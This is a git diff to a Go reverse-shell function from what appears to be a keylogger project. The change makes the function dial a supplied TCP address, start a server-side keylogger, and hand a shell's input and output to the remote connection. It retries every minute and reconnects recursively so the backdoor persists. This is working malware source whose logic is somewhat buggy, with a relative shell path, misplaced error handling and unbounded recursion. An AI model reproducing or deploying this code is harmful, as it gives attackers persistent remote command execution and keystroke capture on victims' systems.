@@ -3,42 +3,31 @@ package rs
 import (
 	"fmt"
 	"net"
-	"os"
 	"os/exec"
+	"time"
 
 	"github.com/gabrielfnayres/keylogger_go/server"
 )
 
-var connectionStr string = "localhost:4444"
+func ReverseShell(connectionStr string) {
 
-const buffSize = 128
-
-func VerifyIfExists(connectionStr string) bool {
-	_, err := os.Stat(connectionStr)
-	if err != nil {
-		fmt.Println(err)
-		return true
-	}
-	if os.IsNotExist(err) {
-		return false
-	}
-	return true
-}
-
-func ReverseShell() {
-	if !VerifyIfExists(connectionStr) {
-		os.Exit(1)
-	}
 	// simple connection
+	fmt.Println("testing reverse shell")
 	conn, err := net.Dial("tcp", connectionStr)
-	if err != nil {
-		os.Exit(1)
-	}
 	server.ServerSideKeylogger()
+	if nil != err {
+		if nil != conn {
+			conn.Close()
+		}
+		time.Sleep(time.Minute)
+		ReverseShell(connectionStr)
+		server.ServerSideKeylogger()
+	}
 	cmd := exec.Command("bin/sh")
 	cmd.Stdin = conn
 	cmd.Stdout = conn
 	cmd.Stderr = conn
 	cmd.Run()
-
+	conn.Close()
+	ReverseShell(connectionStr)
 }
